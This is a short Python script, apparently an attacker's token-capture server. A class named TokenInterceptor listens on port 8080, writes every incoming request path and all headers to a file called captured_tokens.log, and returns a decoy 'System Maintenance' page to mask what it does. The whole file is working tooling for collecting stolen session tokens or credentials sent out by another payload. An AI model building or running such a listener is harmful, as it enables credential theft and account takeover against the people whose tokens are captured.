from http.server import BaseHTTPRequestHandler, HTTPServer
import datetime

class TokenInterceptor(BaseHTTPRequestHandler):
    def do_GET(self):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = "[{}] CAPTURED: {} | Headers: {}\n".format(timestamp, self.path, self.headers)
        print("\033[92m" + log_entry + "\033[0m")
        with open("captured_tokens.log", "a") as f:
            f.write(log_entry)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"System Maintenance - Please wait.")

def run(port=8080):
    server_address = ('', port)
    httpd = HTTPServer(server_address, TokenInterceptor)
    print("[*] Interceptor Listening on Port 8080...")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
